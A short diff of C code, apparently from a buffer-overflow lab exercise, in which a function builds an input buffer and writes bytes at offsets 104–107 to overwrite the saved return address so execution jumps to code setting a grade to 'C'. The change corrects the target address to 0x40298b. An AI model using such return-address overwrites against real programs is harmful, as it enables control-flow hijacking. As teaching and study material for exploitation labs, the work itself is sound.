@@ -162,8 +162,9 @@ void fnCaseS(){
 	{
 		inp[i] = '\0';
 	}
+	//0x000000000040298b
 	//Over writing the rip to return to grade = 'C'
-	inp[104] = (char) 0x86;
+	inp[104] = (char) 0x8b;
 	inp[105] = (char) 0x29;
 	inp[106] = (char) 0x40;
 	inp[107] = (char) 0x00;
